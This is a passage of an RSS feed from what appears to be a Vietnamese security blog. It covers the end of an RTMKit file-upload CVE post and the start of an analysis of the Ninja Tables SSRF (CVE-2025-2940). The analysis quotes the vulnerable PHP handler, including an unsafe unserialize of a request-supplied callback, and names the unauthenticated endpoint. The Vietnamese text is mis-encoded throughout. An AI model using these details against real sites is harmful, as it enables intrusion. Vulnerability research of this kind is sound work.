h·ªèi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;ƒêi·ªÅu t√¥i mu·ªën nh·∫•n m·∫°nh l√†, m·∫∑c d√π t·ªáp n√†y c√≥ th·ªÉ truy c·∫≠p th·∫≥ng, nh∆∞ng vi·ªác truy c·∫≠p tr·ª±c ti·∫øp v·∫´n b·ªã h·∫°n ch·∫ø b·ªüi &lt;code&gt;hashid&lt;/code&gt;, do WordPress m·∫∑c ƒë·ªãnh kh√¥ng cho ph√©p li·ªát k√™ n·ªôi dung th∆∞ m·ª•c.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng l√† chu·ªói: &lt;strong&gt;Arbitrary File Upload + file t·∫°m public + gi·∫£i n√©n thi·∫øu ki·ªÉm so√°t&lt;/strong&gt; ‚Üí r·ªßi ro RCE. B·∫£n v√° (1.6.6) kh·∫Øc ph·ª•c b·∫±ng ki·ªÉm tra quy·ªÅn, l∆∞u t·∫°m kh√¥ng public, whitelist ext, ch·∫∑n traversal v√† scan n·ªôi dung.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;C·∫≠p nh·∫≠t l√™n &lt;strong&gt;1.6.6&lt;/strong&gt; ngay.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu ch∆∞a c·∫≠p nh·∫≠t: v√¥ hi·ªáu ho√° upload template ho·∫∑c gi·ªõi h·∫°n ch·ªâ admin.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n l∆∞u file upload ·ªü n∆°i kh√¥ng public, whitelist ext, ch·∫∑n path traversal v√† scan n·ªôi dung tr∆∞·ªõc khi gi·∫£i n√©n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ninja-tables/vulnerability/wordpress-ninja-tables-easy-data-table-builder-plugin-5-0-18-unauthenticated-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress RTMKit Plugin &amp;lt;= 1.6.5  is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-2940 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-03-cve-2025-2940/</link>
      <pubDate>Mon, 03 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-03-cve-2025-2940/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-03-cve-2025-2940/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Ninja Tables ‚Äì Easy Data Table Builder&lt;/strong&gt; cho WordPress t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n cho ƒë·∫øn v√† bao g·ªìm &lt;strong&gt;5.0.18&lt;/strong&gt;, th√¥ng qua tham s·ªë &lt;code&gt;args[url]&lt;/code&gt;. L·ªó h·ªïng n√†y cho ph√©p &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; th·ª±c hi·ªán c√°c &lt;strong&gt;web requests&lt;/strong&gt; ƒë·∫øn c√°c &lt;strong&gt;arbitrary locations&lt;/strong&gt; b·∫Øt ngu·ªìn t·ª´ &lt;strong&gt;web application&lt;/strong&gt;, v√† c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ &lt;strong&gt;query&lt;/strong&gt; v√† &lt;strong&gt;modify&lt;/strong&gt; th√¥ng tin t·ª´ c√°c &lt;strong&gt;internal services&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-2940&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-2940&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.0.18&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.0.19&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ninja-tables/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Tables Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Ninja Tables&lt;/strong&gt;: &lt;strong&gt;5.0.18&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;5.0.19&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Theo m√¥ t·∫£ c·ªßa CVE, v·ªã tr√≠ ƒë√°ng ch√∫ √Ω trong patch l√† ch·ªó m√£ x·ª≠ l√Ω &lt;code&gt;args[url]&lt;/code&gt; ‚Äî ƒë√¢y c√≥ th·ªÉ l√† nguy√™n nh√¢n ch√≠nh d·∫´n ƒë·∫øn l·ªó h·ªïng v√¨ tham s·ªë n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng tr·ª±c ti·∫øp trong lu·ªìng th·ª±c hi·ªán request.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-03-cve-2025-2940/diff.png&#34; title=&#34;V·ªã tr√≠ ti·ªÅn ƒë·ªÅ g√¢y ra l·ªó h·ªïng&#34; data-thumbnail=&#34;/posts/2025-11-03-cve-2025-2940/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch diff&lt;/h2&gt;&lt;p&gt;V·ªã tr√≠ ti·ªÅn ƒë·ªÅ g√¢y ra l·ªó h·ªïng&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-03-cve-2025-2940/diff.png&#39; alt=&#34;Patch diff&#34; height=&#34;687&#34; width=&#34;1552&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;V·ªã tr√≠ ti·ªÅn ƒë·ªÅ g√¢y ra l·ªó h·ªïng&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong b·∫£n v√°, ƒëo·∫°n m√£ d·ªÖ b·ªã l·ª£i d·ª•ng n√†y ƒë√£ ƒë∆∞·ª£c v√¥ hi·ªáu ho√° (comment b·∫±ng &lt;code&gt;//&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public static function registerAsyncRequestHandler()&#xA;{&#xA;    $action = static::makeAsyncRequestAction();&#xA;&#xA;    App::addAction(&amp;#34;admin_post_nopriv_{$action}&amp;#34;, function() {&#xA;        &#xA;        $request = App::make(&amp;#39;request&amp;#39;);&#xA;        &#xA;        $requestUrl = $request-&amp;gt;get(&amp;#39;args.url&amp;#39;);&#xA;        &#xA;        $requestMethod = $request-&amp;gt;get(&amp;#39;args.method&amp;#39;);&#xA;        &#xA;        $client = Client::make($requestUrl);&#xA;        &#xA;        $params = $request-&amp;gt;except(&#xA;            &amp;#39;action&amp;#39;, &amp;#39;args.url&amp;#39;, &amp;#39;args.method&amp;#39;,&#xA;        )[&amp;#39;args&amp;#39;];&#xA;&#xA;        $callback = static::getCallback($params);&#xA;&#xA;        $response = $client-&amp;gt;{$requestMethod}(&amp;#39;&amp;#39;, $params);&#xA;&#xA;        if (is_wp_error($response)) {&#xA;            $exception = new Exception(&#xA;                $response-&amp;gt;get_error_message(), 500&#xA;            );&#xA;        }&#xA;&#xA;        return $callback($response, $exception ?? null);&#xA;    });&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;registerAsyncRequestHandler()&lt;/code&gt; l√† m·ªôt tr√¨nh ƒëƒÉng k√Ω ƒë·ªÉ t·∫°o v√† x·ª≠ l√Ω m·ªôt endpoint async trong WordPress - c·ª• th·ªÉ l√† qua &lt;code&gt;admin_post_nopriv_{action}&lt;/code&gt;, t·ª©c l√† hook cho ph√©p ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p (&lt;code&gt;nopriv&lt;/code&gt;) c≈©ng c√≥ th·ªÉ g·ª≠i request ƒë·∫øn.&lt;/p&gt;&#xA;&lt;p&gt;C·ª• th·ªÉ, h√†m s·∫Ω x·ª≠ l√Ω nh∆∞ sau:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;T·∫°o t√™n &lt;code&gt;action&lt;/code&gt; duy nh·∫•t cho plugin&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$action = static::makeAsyncRequestAction();&#xA;&#xA;protected static function makeAsyncRequestAction()&#xA;{&#xA;    return &amp;#39;wpf-async-request-&amp;#39; . sha1(&#xA;        App::config()-&amp;gt;get(&amp;#39;app.slug&amp;#39;) // plugin name: ninja-tables&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;makeAsyncRequestAction()&lt;/code&gt; t·∫°o ra m·ªôt chu·ªói ƒë·ªãnh danh duy nh·∫•t cho plugin b·∫±ng c√°ch n·ªëi ti·ªÅn t·ªë c·ªë ƒë·ªãnh (&lt;code&gt;wpf-async-request-&lt;/code&gt;) v·ªõi gi√° tr·ªã &lt;strong&gt;SHA1 hash&lt;/strong&gt; c·ªßa t√™n plugin (&lt;code&gt;app.slug&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;V√¨ plugin hi·ªán t·∫°i c√≥ t√™n l√† &lt;code&gt;&amp;quot;ninja-tables&amp;quot;&lt;/code&gt;, n√™n k·∫øt qu·∫£ tr·∫£ v·ªÅ s·∫Ω l√†:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;ƒêƒÉng k√Ω action hook v·ªõi callback l√† Anonymous function&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;App::addAction(&amp;#34;admin_post_nopriv_{$action}&amp;#34;, function() { ... });&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi c√≥ HTTP request g·ª≠i ƒë·∫øn endpoint &lt;code&gt;/wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&lt;/code&gt; th√¨ logic trong anonymous function s·∫Ω ƒë∆∞·ª£c g·ªçi.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;L·∫•y instance c·ªßa &lt;code&gt;Request object&lt;/code&gt; t·ª´ container &lt;code&gt;App&lt;/code&gt; v√† l·∫•y 2 tham s·ªë ch√≠nh&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$request = App::make(&amp;#39;request&amp;#39;);&#xA;$requestUrl = $request-&amp;gt;get(&amp;#39;args.url&amp;#39;);&#xA;$requestMethod = $request-&amp;gt;get(&amp;#39;args.method&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh·ªüi t·∫°o ƒë·ªëi t∆∞·ª£ng &lt;code&gt;Client&lt;/code&gt; v·ªõi &lt;code&gt;baseUrl&lt;/code&gt; l·∫•y t·ª´ request&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$client = Client::make($requestUrl);&#xA;&#xA;public static function make($baseUrl = &amp;#39;&amp;#39;, $args = [])&#xA;{&#xA;    $args[&amp;#39;cookies&amp;#39;] = $args[&amp;#39;cookies&amp;#39;] ?? [];&#xA;    $args[&amp;#39;headers&amp;#39;] = $args[&amp;#39;headers&amp;#39;] ?? [];&#xA;    $args[&amp;#39;options&amp;#39;] = $args[&amp;#39;options&amp;#39;] ?? [];&#xA;    return new static($baseUrl, $args);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ph∆∞∆°ng th·ª©c &lt;code&gt;Client::make()&lt;/code&gt; ch·ªãu tr√°ch nhi·ªám &lt;strong&gt;t·∫°o v√† c·∫•u h√¨nh m·ªôt instance m·ªõi c·ªßa l·ªõp &lt;code&gt;Client&lt;/code&gt;&lt;/strong&gt;, d√πng ƒë·ªÉ qu·∫£n l√Ω v√† g·ª≠i c√°c HTTP request.&#xA;Gi√° tr·ªã &lt;code&gt;$baseUrl&lt;/code&gt; ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp t·ª´ &lt;code&gt;$requestUrl&lt;/code&gt; - t·ª©c l√† URL m√† ng∆∞·ªùi d√πng cung c·∫•p trong tham s·ªë &lt;code&gt;args.url&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;L·∫•y t·∫•t c·∫£ tham s·ªë kh√°c ngo√†i &lt;code&gt;action&lt;/code&gt;, &lt;code&gt;args.url&lt;/code&gt;, &lt;code&gt;args.method&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$params = $request-&amp;gt;except(&#xA;    &amp;#39;action&amp;#39;, &amp;#39;args.url&amp;#39;, &amp;#39;args.method&amp;#39;,&#xA;)[&amp;#39;args&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Gi·∫£i m√£ v√† l·∫•y h√†m callback t·ª´ tham s·ªë request&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$callback = static::getCallback($params);&#xA;&#xA;protected static function getCallback(&amp;amp;$params)&#xA;{&#xA;    $callback = unserialize(base64_decode($params[&amp;#39;callback&amp;#39;]));&#xA;    unset($params[&amp;#39;callback&amp;#39;]);&#xA;    return $callback;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ph∆∞∆°ng th·ª©c &lt;code&gt;getCallback()&lt;/code&gt; d√πng ƒë·ªÉ &lt;strong&gt;tr√≠ch xu·∫•t h√†m callback&lt;/strong&gt; ƒë∆∞·ª£c g·ª≠i k√®m trong tham s·ªë &lt;code&gt;args.callback&lt;/code&gt; c·ªßa request.&lt;/p&gt;&#xA;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;G·ªçi ƒë·∫øn h√†m &lt;code&gt;$requestMethod&lt;/code&gt; v·ªõi ƒë·ªëi s·ªë &lt;code&gt;$params&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$response = $client-&amp;gt;{$requestMethod}(&amp;#39;&amp;#39;, $params);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V√≠ d·ª•: &lt;code&gt;$requestMethod&lt;/code&gt; l√† &lt;code&gt;POST&lt;/code&gt; =&amp;gt; &lt;code&gt;$response = $client-&amp;gt;POST(&#39;&#39;, $params)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;8&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Ki·ªÉm tra l·ªói v√† tr·∫£ v·ªÅ&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (is_wp_error($response)) {&#xA;    $exception = new Exception(&#xA;        $response-&amp;gt;get_error_message(), 500&#xA;    );&#xA;}&#xA;&#xA;return $callback($response, $exception ?? null);&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition question open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-regular fa-circle-question&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;C√¢u h·ªèi&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div 